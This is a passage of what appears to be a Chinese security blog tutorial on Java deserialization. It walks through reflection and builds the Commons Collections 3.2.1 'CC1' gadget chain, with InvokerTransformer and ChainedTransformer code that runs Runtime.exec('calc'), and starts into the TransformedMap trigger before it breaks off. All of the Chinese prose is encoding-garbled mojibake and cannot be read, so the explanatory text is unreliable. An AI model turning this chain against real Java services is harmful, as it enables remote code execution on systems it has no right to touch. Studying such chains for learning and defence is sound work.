        <content type="html"><![CDATA[<p>åœ¨æ­¤å¿«é€Ÿé‡æ¸©ä¸€éJavaååºåˆ—åŒ–çŸ¥è¯†</p><h2 id="åå°„"><a href="#åå°„" class="headerlink" title="åå°„"></a>åå°„</h2><blockquote><ul><li><p>Constructorç±»å‹å­˜å‚¨getConstructorè·å–çš„æœ‰å‚æˆ–æ— å‚æ„é€ å‡½æ•°ã€‚å…¶ä¸­getConstructorå‚æ•°ä¸ºéœ€è¦è·å–çš„æ„é€ å‡½æ•°å½¢å‚ç±»å‹ï¼Œå¦‚String.classï¼ŒClass[].class</p></li><li><p>newInstanceå®ä¾‹åŒ–å¯¹è±¡ï¼Œå¯ä»åŸå‹å®ä¾‹åŒ–å¯¹è±¡ï¼Œå¦‚person.getClass().newInstance()</p></li></ul><p>å½“ç„¶è¿™ç§å®ä¾‹åŒ–åªèƒ½è°ƒç”¨æ— å‚æ„é€ å‡½æ•°å®ä¾‹åŒ–ã€‚å¯ä»¥å…ˆè·å–æ„é€ å™¨ï¼Œå†è°ƒç”¨æœ‰å‚æ„é€ å‡½æ•°å®ä¾‹åŒ–ï¼Œå¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> person.getClass();</span><br><span class="line">&gt;<span class="type">Constructor</span> <span class="variable">personconstructor</span> <span class="operator">=</span> c.getConstructor(String.Class,<span class="type">int</span>.class);</span><br><span class="line">&gt;<span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> (Person) personconstructor.newInstance(<span class="string">&quot;abc&quot;</span>,<span class="number">21</span>);</span><br></pre></td></tr></table></figure><ul><li>Fieldå­˜å‚¨ç±»é‡Œçš„å±æ€§ã€‚å¦‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;Field[] personfields = c.getDeclaredFields();</span><br><span class="line">&gt;<span class="keyword">for</span>(Field f:personfields)&#123;</span><br><span class="line">  ...</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure><ul><li>Methodå­˜å‚¨è·å–çš„ç±»æ–¹æ³•ã€‚getMethod()è·å–ç±»æ–¹æ³•</li><li>invokeæ‰§è¡Œè·å–çš„methodæ–¹æ³•</li></ul><p>ä»¥ä¸Šæ–¹æ³•åŠ declaredè·å–ç§æœ‰å†…å®¹ï¼Œå¦‚getDecalredFields()è·å–ç§æœ‰å±æ€§</p><p>ä½¿ç”¨setAccessible(true)å…è®¸ä¿®æ”¹ç§æœ‰å˜é‡ï¼Œç§æœ‰æ–¹æ³•ç­‰privateå†…å®¹</p></blockquote><p>ä»¥ä¸Šå†…å®¹ä¸ç€æ€¥ç†è§£ï¼Œæ¥ç€å¾€ä¸‹çœ‹</p><p>ååºåˆ—åŒ–éœ€è¦ä»èƒ½invokeæ‰§è¡Œä»£ç çš„éƒ¨åˆ†èµ°åˆ°readObjectï¼Œåºåˆ—åŒ–æ—¶å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚</p><p>æ¯”å¦‚Runtimeç±»ä¸‹çš„execæ–¹æ³•å°±èƒ½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œæˆ‘ä»¬é€šå¸¸ä½¿ç”¨å•å½¢å‚çš„è¿™ä¸ªexecï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240705214001199.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240705214001199.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><blockquote><p>ä»¥é˜²æœ‰äººåŸºç¡€ä¸ç‰¢ï¼Œæ¯”å¦‚æˆ‘ã€‚æ­¤å¤„ä¸ºjavaçš„ä¸€äº›æ˜“æ¼å‰ç½®çŸ¥è¯†ã€‚</p><p>javaä»¥æ˜¯å¦æœ‰staticå…³é”®å­—åŒºåˆ†äº†å®ä¾‹æ–¹æ³•å’Œé™æ€æ–¹æ³•ã€‚</p><ul><li>å®ä¾‹æ–¹æ³•ï¼šå¿…é¡»é€šè¿‡å·²ç»å®ä¾‹åŒ–çš„å¯¹è±¡æ¥è°ƒç”¨ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ æœ‰ä¸€ä¸ªåä¸ºMyClassçš„ç±»ï¼Œå¹¶ä¸”å®ƒæœ‰ä¸€ä¸ªå®ä¾‹æ–¹æ³•doSomething()ï¼Œä½ éœ€è¦å…ˆåˆ›å»ºMyClassçš„ä¸€ä¸ªå®ä¾‹ï¼Œç„¶åé€šè¿‡è¿™ä¸ªå®ä¾‹æ¥è°ƒç”¨æ–¹æ³•ï¼Œå¦‚<code>MyClass instance = new MyClass(); instance.doSomething();</code>ã€‚</li><li>é™æ€æ–¹æ³•ï¼ˆå¯ä»¥ç›´æ¥è°ƒç”¨çš„æ–¹æ³•ï¼‰ï¼šå¯ä»¥é€šè¿‡ç±»åç›´æ¥è°ƒç”¨ï¼Œæ— éœ€åˆ›å»ºç±»çš„å®ä¾‹ã€‚ä¾‹å¦‚ï¼Œå¦‚æœMyClassæœ‰ä¸€ä¸ªé™æ€æ–¹æ³•staticMethod()ï¼Œä½ å¯ä»¥ç›´æ¥é€šè¿‡ç±»åè°ƒç”¨å®ƒï¼Œå¦‚MyClass.staticMethod();</li></ul></blockquote><p>Runtime.exec()å°±æ˜¯å®ä¾‹æ–¹æ³•ï¼Œéœ€è¦åœ¨å®ä¾‹åŒ–å¯¹è±¡ä¸Šè¿›è¡Œè°ƒç”¨ã€‚Runtime.getRuntime()è¿”å›ä¸€ä¸ªå•ä¾‹å®ä¾‹ã€‚</p><blockquote><p>å› ä¸ºRuntimeç±»æ²¡æœ‰å…¬å¼€çš„æ„é€ æ–¹æ³•ï¼ŒgetRuntime()æ–¹æ³•å®é™…ä¸Šæ˜¯è¿”å›äº†è¯¥ç±»çš„ä¸€ä¸ªå•ä¾‹å®ä¾‹ã€‚è¿™æ ·åšå¯ä»¥ç¡®ä¿æ•´ä¸ªåº”ç”¨ç¨‹åºä¸­åªæœ‰ä¸€ä¸ªRuntimeå®ä¾‹å­˜åœ¨ï¼Œè¿™æ ·å¯ä»¥æ›´å¥½åœ°ç®¡ç†èµ„æºå’Œç¯å¢ƒäº¤äº’</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240705220412807.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240705220412807.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p></blockquote><p>æ‰€ä»¥ä½¿ç”¨<code>Runtime.getRuntime().exec(&quot;calc&quot;);</code>å°±èƒ½è°ƒç”¨ç³»ç»Ÿè®¡ç®—å™¨ã€‚</p><p>ä½†æ˜¯Runtimeç±»æ²¡æœ‰ç»§æ‰¿Serializableï¼Œæ‰€ä»¥ä¸èƒ½åºåˆ—åŒ–ã€‚InvokerTransformerç»§æ‰¿äº†Serializableï¼Œä¸”å…¶transformerè°ƒç”¨äº†invokeï¼Œæœ‰invokeå½“ç„¶å°±èƒ½ç”¨invokeåå°„è°ƒç”¨åˆ°Runtimeä¸­çš„execã€‚åå°„çŸ¥è¯†ï¼š<a href="https://www.cnblogs.com/chanshuyi/p/head_first_of_reflection.html">https://www.cnblogs.com/chanshuyi/p/head_first_of_reflection.html</a></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240705215406266.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240705215406266.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å…ˆæŠŠ<code>Runtime.getRuntime.exec(&quot;calc&quot;);</code>æ”¹ä¸ºåå°„è°ƒç”¨ï¼š</p><p>å…¶ä¸­invokeè°ƒç”¨æ ¼å¼ä¸ºï¼š<code>æ–¹æ³•.invoke(å¯¹è±¡,å‚æ•°)</code></p><p>getMethodè°ƒç”¨æ ¼å¼ä¸ºï¼š<code>å¯¹è±¡.getMethod(æ–¹æ³•å,è¯¥æ–¹æ³•å‚æ•°ç±»å‹)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">Class&lt;?&gt; c = Runtime.class;</span><br><span class="line"><span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">m.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><p>getRuntime()æ˜¯ä¸æ˜¯ä¹Ÿèƒ½é¡ºä¾¿æ”¹æˆåå°„äº†å‘¢ï¼Ÿ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä»£ç 1</span></span><br><span class="line">Class&lt;Runtime&gt; c = Runtime.class;</span><br><span class="line"><span class="type">Method</span> <span class="variable">gMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>);<span class="comment">//getRuntimeæ— å‚ï¼Œå³null</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">r</span> <span class="operator">=</span> gMethod.invoke(<span class="literal">null</span>,<span class="literal">null</span>);<span class="comment">//æ‰§è¡ŒgetRuntimeï¼Œé™æ€æ–¹æ³•æ— éœ€å®ä¾‹ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºnullï¼›</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);<span class="comment">//execå‚æ•°ç±»å‹ä¸ºstring</span></span><br><span class="line">execMethod.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><p>pom dependencyï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æŠ¥mavenæ’ä»¶ç‰ˆæœ¬é”™è¯¯çš„ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-site-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.12.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å»æ‰¾ä¸ªjdkæºç ç‰ˆæˆ–è€…OpenJDKæ‰¾å¯¹åº”jdkç‰ˆæœ¬çš„sunåŒ…å¤åˆ¶å¯¹åº”ç›®å½•æ‰èƒ½æ­£å¸¸è°ƒè¯•ã€‚</p><p>å·æ‡’é“¾æ¥ï¼š<a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip">https://hg.openjdk.org/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip</a></p><h3 id="æ”¹é€ Runtimeä¸ºå¯åºåˆ—åŒ–"><a href="#æ”¹é€ Runtimeä¸ºå¯åºåˆ—åŒ–" class="headerlink" title="æ”¹é€ Runtimeä¸ºå¯åºåˆ—åŒ–"></a>æ”¹é€ Runtimeä¸ºå¯åºåˆ—åŒ–</h3><p>CC1ç”¨InvokerTransformer.transformä»£ä¸ºæ‰§è¡Œinvokeï¼Œä¸”æ»¡è¶³äº†ç»§æ‰¿Serializableåºåˆ—åŒ–å¯ä¼ è¾“çš„åŠŸèƒ½ã€‚</p><p><code>Class&lt;?&gt; c = Runtime.class;</code>æ˜¯å¯ä»¥åºåˆ—åŒ–çš„ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709162849477.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709162849477.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ ¹æ®ä¸Šé¢çš„ä»£ç 1ï¼Œå¯ä»¥å¾ˆè½»æ¾åœ°ç”¨InvokerTransformerçš„æ„é€ æ–¹æ³•ä¼ å…¥åå°„æ‰§è¡Œçš„å‚æ•°ã€‚ä»è€Œæ›¿ä»£ä»£ç 1</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240705220821452.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240705220821452.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240705223655683.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240705223655683.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä»”ç»†é˜…è¯»transformçš„ä»£ç ï¼ŒInvokerTransformerä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºgetMethodè°ƒç”¨çš„æ–¹æ³•åï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºè¯¥æ–¹æ³•æ‰€éœ€çš„å½¢å‚ç±»å‹ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºè¯¥æ–¹æ³•æ‰§è¡Œæ—¶ä¼ å…¥çš„å½¢å‚ã€‚è€Œtransformæ¥æ”¶çš„å‚æ•°ä¸ºå®ä¾‹å¯¹è±¡ã€‚</p><ol><li><code>Method gMethod = c.getMethod(&quot;getRuntime&quot;,null);</code>å¯æ›¿æ¢ä¸ºï¼š</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">getMethod</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;);</span><br><span class="line"><span class="type">Method</span> <span class="variable">gMethod</span> <span class="operator">=</span> (Method) getMethod.transform(Runtime.class);</span><br></pre></td></tr></table></figure><p>å› ä¸ºgetMethodæ¥æ”¶çš„å½¢å‚ç±»å‹å¦‚ä¸‹ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708150513048.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708150513048.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>Stringå¯¹åº”String.class   Class&lt;?&gt;å¯¹åº”Class[].class</p><p>è¿›ä¸€æ­¥å¯ç®€åŒ–ä¸ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">gMethod</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class);</span><br></pre></td></tr></table></figure><ol start="2"><li>åŒç†ï¼Œ<code>Object r = gMethod.invoke(null,null);</code>å¯ä»¥æ”¹å†™ä¸ºï¼š</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(gMethod);</span><br></pre></td></tr></table></figure><ol start="3"><li><code>Method execMethod = c.getMethod(&quot;exec&quot;, String.class);</code>å¯æ”¹å†™ä¸ºï¼š</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span>(Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;&#125;).transform(Runtime.class);</span><br></pre></td></tr></table></figure><ol start="4"><li><code>execMethod.invoke(r,&quot;calc&quot;);</code>å¯æ”¹å†™ä¸ºï¼š</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;r,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;).transform(execMethod);</span><br></pre></td></tr></table></figure><p>ä¾æ—§èƒ½è¾¾åˆ°æ•ˆæœ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708155629476.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708155629476.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¦‚æœåœ¨ç¬¬ä¸‰å¥ï¼Œä½¿ç”¨Runtimeç±»å‹å­˜å‚¨invokeç»“æœï¼Œå³Runtime.getRuntime()å®ä¾‹ï¼Œåˆ™èƒ½åœ¨æ­¤å®ä¾‹ä¸Šç›´æ¥è°ƒç”¨execï¼šï¼ˆå¹¶ä¸æ˜¯è¿™é‡Œå°±èƒ½åºåˆ—åŒ–äº†ï¼Œå› ä¸ºè¿˜æ˜¯Runtimeå­˜å‚¨çš„ï¼Œåç»­è½¬æˆInvokerTransformeræ‰èƒ½åºåˆ—åŒ–ï¼‰</p><blockquote><p>æ²¡æœ‰ç»§æ‰¿serializableçš„ä¸€äº›ç±»ä¾ç„¶æœ‰åŠæ³•åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­è·å–å®ä¾‹ï¼Œå®é™…ä¸Šæ•´ä¸ªåºåˆ—åŒ–è¿‡ç¨‹éƒ½æ²¡æœ‰ç”¨åˆ°Runtimeçš„å®ä¾‹ï¼Œåˆ›å»ºå®ä¾‹çš„è¿‡ç¨‹å‘ç”Ÿåœ¨ååºåˆ—åŒ–é€”ä¸­ã€‚ä½†è¿™ç§æ–¹å¼è¦æ±‚<code>æ„é€ å‡½æ•°</code>æˆ–è€…<code>è·å–å®ä¾‹çš„æ–¹æ³•</code>èƒ½ä¼ è¿›éœ€è¦çš„å‚æ•°ï¼Œå› ä¸ºæˆ‘ä»¬åªæœ‰InvokerTransformerçš„è¿‡ç¨‹æ˜¯åå°„è°ƒç”¨ä»»æ„æ–¹æ³•ï¼Œè€Œé“¾å¼çš„è¿‡ç¨‹ä¸­æ— æ³•å†å»åå°„ä¿®æ”¹å®ä¾‹çš„å­—æ®µï¼ˆè¦æ»¡è¶³é“¾å¼ï¼Œä¸Šä¸€ä¸ªtransform()ç»“æœä½œä¸ºä¸‹ä¸€ä¸ªå‚æ•°ï¼‰ã€‚</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;Runtime&gt; c = Runtime.class;</span><br><span class="line"><span class="type">Method</span> <span class="variable">gMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>);<span class="comment">//getRuntimeæ— å‚ï¼Œå³null</span></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) gMethod.invoke(<span class="literal">null</span>,<span class="literal">null</span>);<span class="comment">//æ‰§è¡ŒgetRuntimeï¼Œé™æ€æ–¹æ³•æ— éœ€å®ä¾‹ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºnullï¼›</span></span><br><span class="line">r.exec(<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><p>åˆ™è¯¥ä»£ç ä¿®æ”¹ä¸ºInvokeTransformerç‰ˆåªéœ€ä¸‰å¥ï¼Œä¸”ä¸ºé“¾å¼ï¼ˆä¸Šä¸€ä¸ªç»“æœä¼ å…¥ä¸‹ä¸€ä¸ªå½¢å‚ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä»£ç 2</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">gMethod</span> <span class="operator">=</span>(Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(gMethod);</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(Runtime.class);</span><br></pre></td></tr></table></figure><p>ç°åœ¨å°±èƒ½åºåˆ—åŒ–äº†ï¼Œé¦–å…ˆå› ä¸ºInvokerTransformerç»§æ‰¿äº†Serializableï¼Œå…¶æ¬¡åœ¨ç±»é‡Œè°ƒç”¨çš„æ–¹æ³•å®é™…ä¸Šè¿˜æ˜¯invokeã€‚åˆ°è¿™é‡Œå°±æˆåŠŸä¸€åŠäº†</p><p>ä½†æ˜¯è¿™æ ·è¿ç»­å†™ä¸‰éä¼šä¸ä¼šå¾ˆéº»çƒ¦ï¼ŸChainedTransformeræ¥æ”¶ä¸€ä¸ªtransformeræ•°ç»„ï¼Œä¸”ChainedTransformer.transform()ä¼šå¯¹è¯¥æ•°ç»„è¿›è¡Œé“¾å¼è°ƒç”¨ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708162342590.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708162342590.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>InvokerTransformerå®ç°äº†Transformeræ¥å£ï¼Œnewçš„å®ä¾‹å¯ä»¥èµ‹å€¼ç»™çˆ¶ç±»æˆ–æ¥å£ï¼Œå³æ”¹å†™å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä»£ç 3</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        chainedTransformer.transform(Runtime.class);</span><br></pre></td></tr></table></figure><h3 id="TransformedMap-checkValue-è§¦å‘transformer"><a href="#TransformedMap-checkValue-è§¦å‘transformer" class="headerlink" title="TransformedMap.checkValue()è§¦å‘transformer"></a>TransformedMap.checkValue()è§¦å‘transformer</h3><p>æ‰§è¡Œå‘½ä»¤çš„éƒ¨åˆ†å†™å¥½äº†ï¼Œç°åœ¨å€’å›å»æ‰¾è§¦å‘åˆ°readObjectçš„éƒ¨åˆ†ï¼Œæ— è®ºæ˜¯å¦ç»è¿‡ChainedTransformerï¼Œéƒ½æ˜¯è°ƒç”¨transform()æ–¹æ³•ã€‚æŸ¥çœ‹å…¶ç”¨æ³•ï¼š</p><p>ä½¿ç”¨åˆ°è¯¥æ–¹æ³•çš„ç±»å¾ˆå¤šï¼Œæ¯”å¦‚ä»¥ä¸‹ä¸‰ä¸ªï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708164815135.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708164815135.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿™é‡Œçš„LazyMapå’ŒTransformedMapéƒ½å­˜åœ¨ååºåˆ—åŒ–é“¾ã€‚å…ˆæ¥çœ‹TransformedMap#checkSetValue()</p><p>è°ƒç”¨äº†valueTransformerçš„transformæ–¹æ³•ã€‚ä½¿valueTransformerä¸ºæŒ‡å®šçš„ChainedTransformerå³å¯</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708164927727.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708164927727.png" 